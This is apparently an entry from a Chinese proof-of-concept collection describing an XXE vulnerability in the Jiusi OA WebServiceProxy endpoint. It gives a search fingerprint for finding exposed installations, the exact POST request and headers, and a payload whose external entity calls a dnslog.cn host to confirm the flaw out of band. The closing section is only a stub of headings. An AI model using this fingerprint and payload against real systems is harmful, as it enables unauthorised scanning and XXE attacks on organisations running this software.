# 九思OAWebServiceProxy存在xxe漏洞

- **系统**：九思　|　**类型**：XXE　|　**CVE**：—
- **指纹**：`web.body="/jsoa/webmail/ajax_util.js"`
- **请求**：`POST /jsoa/WebServiceProxy HTTP/1.1`
- **关键头**：`Content-Length: 79`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://bsp6oo.dnslog.cn"> %remote;]>

```

**其他**
- 九思OA WebServiceProxy存在xxe漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 九思OA